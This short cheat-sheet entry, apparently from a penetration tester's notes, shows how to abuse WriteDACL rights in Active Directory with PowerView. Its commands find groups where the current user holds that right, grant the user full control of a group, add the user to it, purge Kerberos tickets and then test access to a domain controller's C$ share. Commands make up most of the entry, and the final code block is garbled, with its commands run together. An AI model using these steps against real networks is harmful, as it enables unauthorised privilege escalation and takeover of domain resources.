# Abuse WriteDACL

Find domain groups that current user has `WriteDACL` access right to:

```
PowerView3 > Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | % {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | % {if ($_.Identity -eq $("$env:UserDomain\$env:UserName")) {$_}} | ? {$_.ActiveDirectoryRights -like "*WriteDacl*"}
```

The attacker can take the full control of discovered groups and then add a users to them:

```
PowerView3 > Add-DomainObjectAcl -TargetIdentity "IT Desk" -PrincipalIdentity snovvcrash -Domain tricky.com -Rights All -Verbose
PowerView3 > Add-DomainGroupMember -Identity "IT Desk" -Members snovvcrash -Verbose
```

#### Group membership will take its sweet time to be updated within target user's TGT. To [force](http://woshub.com/how-to-refresh-ad-groups-membership-without-user-logoff/) the update one may purge existing tickets and request new TGT:

```
Cmd > klist purgeCmd > gpupdate /forceCmd > dir \\dc1.megacorp.local\c$
```
